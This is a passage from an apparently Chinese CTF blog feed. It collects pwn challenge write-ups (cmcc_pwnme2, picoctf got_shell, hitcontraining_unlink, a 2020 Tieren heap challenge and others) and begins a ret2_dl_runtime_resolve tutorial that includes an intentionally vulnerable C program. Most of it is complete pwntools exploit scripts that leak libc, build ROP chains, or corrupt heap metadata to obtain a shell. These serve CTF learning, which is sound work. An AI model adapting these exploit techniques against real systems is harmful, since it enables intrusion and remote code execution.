class="line">main_addr&#x3D;0x00000000004008F6</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)+&#39;a&#39;*0xa8+p64(stack_addr)+p64(leave_ret)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(&#39;Byebye~\n&#39;)</span><br><span class="line">puts_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;puts_addr : &#39; +hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&#39;puts&#39;,puts_addr)</span><br><span class="line">libc_base&#x3D;puts_addr-libc.dump(&#39;puts&#39;)</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">one_gadget&#x3D;libc_base+0x4f2c5</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">sh.sendline(str(0xe0))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Your message will be saved at &#39;)</span><br><span class="line">stack_addr&#x3D;int(sh.recv(14),16)</span><br><span class="line">sh.success(&#39;stack_addr : &#39; +hex(stack_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*8+p64(one_gadget)+&#39;a&#39;*(0xd0-0x10)+p64(stack_addr)+p64(leave_ret)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="cmcc-pwnme2"><a href="#cmcc-pwnme2" class="headerlink" title="cmcc_pwnme2"></a>cmcc_pwnme2</h3><h4 id="checksec检查：-57"><a href="#checksec检查：-57" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-65"><a href="#利用：-65" class="headerlink" title="利用："></a>利用：</h4><p>简单题</p>
<h4 id="exp如下：-61"><a href="#exp如下：-61" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwnme2&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,25121)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwnme2&#39;)</span><br><span class="line"></span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">main_addr &#x3D; elf.sym[&#39;main&#39;]</span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">payload &#x3D; &#39;a&#39; * (0x6c + 4) + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">#sh.recvuntil(&#39;Please input:\n&#39;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr&#x3D;u32(sh.recvuntil(&#39;\xf7&#39;)[-4:])</span><br><span class="line">sh.success(&#39;puts_addr : &#39; +hex(puts_addr))</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;puts&#39;, puts_addr)</span><br><span class="line">libc_base &#x3D; puts_addr - libc.dump(&#39;puts&#39;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">str_bin_sh &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x6c+&#39;a&#39;*0x4+p32(system_addr)+p32(main_addr)+p32(str_bin_sh)</span><br><span class="line">sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="picoctf-2018-can-you-gets-me"><a href="#picoctf-2018-can-you-gets-me" class="headerlink" title="picoctf_2018_can_you_gets_me"></a>picoctf_2018_can_you_gets_me</h3><h4 id="checksec检查：-58"><a href="#checksec检查：-58" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-66"><a href="#利用：-66" class="headerlink" title="利用："></a>利用：</h4><p>静态编译，ROPgadget工具一键生成rop链你值得拥有。</p>
<h4 id="exp如下：-62"><a href="#exp如下：-62" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;PicoCTF_2018_can-you-gets-me&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,26568)</span><br><span class="line"></span><br><span class="line">p &#x3D; &#39;a&#39;*0x18+&#39;a&#39;*4</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080b81c6) # pop eax ; ret</span><br><span class="line">p +&#x3D; &#39;&#x2F;bin&#39;</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080b81c6) # pop eax ; ret</span><br><span class="line">p +&#x3D; &#39;&#x2F;&#x2F;sh&#39;</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x08049303) # xor eax, eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080de955) # pop ecx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x08049303) # xor eax, eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806cc25) # int 0x80</span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="axb-2019-brop64"><a href="#axb-2019-brop64" class="headerlink" title="axb_2019_brop64"></a>axb_2019_brop64</h3><h4 id="checksec检查：-59"><a href="#checksec检查：-59" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-67"><a href="#利用：-67" class="headerlink" title="利用："></a>利用：</h4><p>栈溢出</p>
<h4 id="exp如下：-63"><a href="#exp如下：-63" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;axb_2019_brop64&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,28031)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;axb_2019_brop64&#39;)</span><br><span class="line"></span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">main_addr &#x3D; elf.symbols[&#39;main&#39;]</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">pop_rdi_ret&#x3D;0x0000000000400963</span><br><span class="line">payload &#x3D; &#39;a&#39; *0xd0+&#39;a&#39;*8</span><br><span class="line">payload+&#x3D;p64(pop_rdi_ret)+p64(read_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Please tell me:&#39;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(0.5)</span><br><span class="line">read_addr&#x3D;u64(sh.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;read_addr : &#39; +hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;read&#39;, read_addr)</span><br><span class="line">libc_base &#x3D; read_addr - libc.dump(&#39;read&#39;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">str_bin_sh &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * (0xd0 + 8)</span><br><span class="line">payload+&#x3D;p64(pop_rdi_ret)+p64(str_bin_sh) +p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="picoctf-2018-got-shell"><a href="#picoctf-2018-got-shell" class="headerlink" title="picoctf_2018_got_shell"></a>picoctf_2018_got_shell</h3><h4 id="checksec检查：-60"><a href="#checksec检查：-60" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-68"><a href="#利用：-68" class="headerlink" title="利用："></a>利用：</h4><p>根据程序提示输入即可</p>
<h4 id="exp如下：-64"><a href="#exp如下：-64" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python </span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;PicoCTF_2018_got-shell&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27588)</span><br><span class="line"></span><br><span class="line">sleep(0.5)</span><br><span class="line">sh.sendline(&#39;0804a014&#39;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sh.sendline(&#39;0804854B&#39;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a>hitcontraining_unlink</h3><h4 id="checksec检查：-61"><a href="#checksec检查：-61" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>利用：</p>
<p>unlink攻击，改atoi为system</p>
<h4 id="exp如下：-65"><a href="#exp如下：-65" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;bamboobox&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,28460)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;bamboobox&#39;)</span><br><span class="line">#libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;3&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">     sh.recvuntil(&#39;:&#39;)</span><br><span class="line">     sh.sendline(&#39;4&#39;)</span><br><span class="line">     sh.recvuntil(&#39;:&#39;)</span><br><span class="line">     sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">fd&#x3D;0x6020d8-0x18</span><br><span class="line">bk&#x3D;0x6020d8-0x10</span><br><span class="line">atoi_got&#x3D;elf.got[&#39;atoi&#39;]</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">add(0x20,&#39;aaaa&#39;) #0</span><br><span class="line">add(0x80,&#39;bbbb&#39;) #1</span><br><span class="line">add(0x80,&#39;cccc&#39;) #2</span><br><span class="line">add(0x10,&#39;dddd&#39;) #3</span><br><span class="line">edit(1,0x90,p64(0)+p64(0x81)+p64(fd)+p64(bk)+&#39;a&#39;*0x60+p64(0x80)+p64(0x90))</span><br><span class="line">free(2)</span><br><span class="line">edit(1,0x20,p64(0x20)+p64(atoi_got))</span><br><span class="line">show()</span><br><span class="line">atoi_addr&#x3D;u64(sh.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;atoi_addr : &#39; +hex(atoi_addr))</span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&#39;atoi&#39;,atoi_addr)</span><br><span class="line">libc_base&#x3D;atoi_addr-libc.dump(&#39;atoi&#39;)</span><br><span class="line">system_addr&#x3D;libc_base+libc.dump(&#39;system&#39;)</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">sh.success(&#39;system_addr : &#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">edit(0,0x20,p64(system_addr))</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2020铁人三项第一赛区个人赛pwn复现</title>
    <url>/2020/11/03/2020%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E7%AC%AC%E4%B8%80%E8%B5%9B%E5%8C%BA%E4%B8%AA%E4%BA%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/11/02/hx1fYSpWtGQ9aNR.jpg" alt="5f8965c41cd34.jpg"></p>
<a id="more"></a>

<h3 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h3><h4 id="checksec检查："><a href="#checksec检查：" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p>uaf漏洞，格式化字符串漏洞，堆溢出漏洞，直接fastbin attach来getshell</p>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;heap&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;heap&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">	sh.recvuntil(&#39;Input your choice: &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	sh.recvuntil(&#39;Input your choice: &#39;)</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">	sh.recvuntil(&#39;Input your choice: &#39;)</span><br><span class="line">	sh.sendline(&#39;3&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;Input your choice: &#39;)</span><br><span class="line">	sh.sendline(&#39;4&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;: &#39;)</span><br><span class="line">sh.sendline(&#39;L0ne1y&#39;)</span><br><span class="line"></span><br><span class="line">add(0x10) #0</span><br><span class="line">add(0x60) #1</span><br><span class="line">add(0x60) #2</span><br><span class="line">add(0x10) #3</span><br><span class="line">edit(0,&#39;a&#39;*0x18+p64(0xe1))</span><br><span class="line">free(1)</span><br><span class="line">show(1)</span><br><span class="line">sh.recvuntil(&#39;item 1: &#39;)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">one_gadget&#x3D;libc_base+0x4527a</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">sh.success(&#39;malloc_hook : &#39; +hex(malloc_hook))</span><br><span class="line">realloc&#x3D;libc_base+libc.symbols[&#39;realloc&#39;]</span><br><span class="line">sh.success(&#39;realloc : &#39; +hex(realloc))</span><br><span class="line">add(0x60) #4&#x3D;&#x3D;1</span><br><span class="line">add(0x60) #5&#x3D;&#x3D;2</span><br><span class="line">free(5)</span><br><span class="line">edit(2,p64(malloc_hook-0x23))</span><br><span class="line">add(0x60) #6</span><br><span class="line">add(0x60) #7</span><br><span class="line">edit(7,&#39;aaa&#39;+p64(0)+p64(one_gadget)+p64(realloc+0xc))</span><br><span class="line">add(0x10)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h3><h4 id="checksec检查：-1"><a href="#checksec检查：-1" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="利用：-1"><a href="#利用：-1" class="headerlink" title="利用："></a>利用：</h4><p>格式化字符串泄露libc，然后改函数指针为one_gadget</p>
<h4 id="exp如下：-1"><a href="#exp如下：-1" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;hacknote&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;hacknote&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(&#39;1&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.send(content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">sh.recvuntil(&quot;what&#39;s your name!\n&quot;)</span><br><span class="line">sh.sendline(&#39;%13$p&#39;)</span><br><span class="line">sh.recvuntil(&#39;,&#39;)</span><br><span class="line">libc_start_main&#x3D;int(sh.recv(14),16)-240</span><br><span class="line">sh.success(&#39;libc_start_main : &#39; +hex(libc_start_main))</span><br><span class="line">libc_base&#x3D;libc_start_main-libc.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">system_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]</span><br><span class="line">sh.success(&#39;system_addr : &#39; +hex(system_addr))</span><br><span class="line">one_gadget&#x3D;libc_base+0xf1207</span><br><span class="line"></span><br><span class="line">add(0x20,&#39;L0ne1y&#39;) #0</span><br><span class="line">add(0x20,&#39;L0ne1y&#39;) #1</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">add(0x10,p64(one_gadget)) #2</span><br><span class="line">show(0)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2_dl_runtime_resolve学习</title>
    <url>/2020/11/01/ret2-dl-runtime-resolve%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/11/01/JGEd5Zx3sP1NWOr.jpg" alt="5f8e8b8f45dd7.jpg"></p>
<a id="more"></a>

<h2 id="ret2-dl-runtime-resolve"><a href="#ret2-dl-runtime-resolve" class="headerlink" title="ret2_dl_runtime_resolve"></a>ret2_dl_runtime_resolve</h2><p>上面我们学习了ELF文件结构和动态链接过程，下面我以WIKI上的例题来学习一下。</p>
<p>我们知道_dl_runtime_resolve函数的核心就是_dl_fixup函数，而在_dl_fixup中我们只要伪造了reloc_arg，使该函数的重定位表项位于我们可控制的位置；再伪造重定位表项（即r_offset和r_info），可使该函数的动态链接符号表表项位于我们可控制的位置；然后，伪造动态链接符号表表项（即st_name、st_value、st_size、st_info、st_other、st_shndx），主要是st_name的值，使该函数动态链接字符串表表项位于我们控制的位置；最后，伪造动态链接字符串表表项值为我们想要解析的函数名，就可以了。</p>
<h3 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h3><p>1.控制<code>eip</code>为PLT[0]的地址，只需传递一个<code>index_arg</code>参数<br>2.控制<code>index_arg</code>的大小，使<code>reloc</code>的位置落在可控地址内<br>3.伪造<code>reloc</code>的内容，使<code>sym</code>落在可控地址内<br>4.伪造<code>sym</code>的内容，使<code>name</code>落在可控地址内<br>5.伪造<code>name</code>为任意库函数，如<code>system</code></p>
<p>这里构造一个存在栈缓冲区漏洞的程序，以方便后续构造ROP链。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void vuln()</span><br><span class="line">&#123;</span><br><span class="line">    char buf[100];</span><br><span class="line">    setbuf(stdin, buf);</span><br><span class="line">    read(0, buf, 256);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char buf[100] &#x3D; &quot;Welcome to XDCTF2015~!\n&quot;;</span><br><span class="line"></span><br><span class="line">    setbuf(stdout, buf);</span><br><span class="line">    write(1, buf, strlen(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gcc -o bof -m32 -fno-stack-protector bof.c</span><br></pre></td></tr></table></figure>

<p><strong>stage1</strong><br>我们先写一个ROP链，直到返回到<code>write@plt</code></p>
